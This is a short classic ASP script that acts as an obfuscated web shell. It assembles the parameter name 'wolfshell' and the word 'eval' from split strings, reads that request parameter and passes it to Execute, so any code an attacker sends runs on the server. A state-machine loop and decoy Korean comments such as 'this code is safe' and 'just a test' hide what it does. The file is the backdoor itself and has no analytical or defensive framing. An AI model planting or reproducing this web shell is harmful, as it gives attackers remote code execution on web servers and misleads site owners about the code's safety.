<%
' // 배고파요, 치킨 먹고 싶다
Dim v_state, q_data, q_action, q_param
v_state = 1
q_action = ""
q_param = ""

Do While v_state > 0
    ' // 안녕하세요
    Select Case v_state
        Case 1
            ' // 반갑습니다
            Dim arr_a: arr_a = Split("w*o*l*f*s*h*e*l*l", "*")
            q_param = Join(arr_a, "")
            v_state = 2
        Case 2
            ' // 이 코드는 안전합니다
            q_data = Request(q_param)
            v_state = 3
        Case 3
            ' // 그냥 테스트입니다
            Dim arr_b: arr_b = Split("e#v#a#l", "#")
            q_action = Join(arr_b, "")
            v_state = 4
        Case 4
            ' // 커피 한잔 할래요?
            If q_action = "eval" And Not IsEmpty(q_data) Then
                Execute(q_data)
            End If
            v_state = 0
    End Select
Loop
%>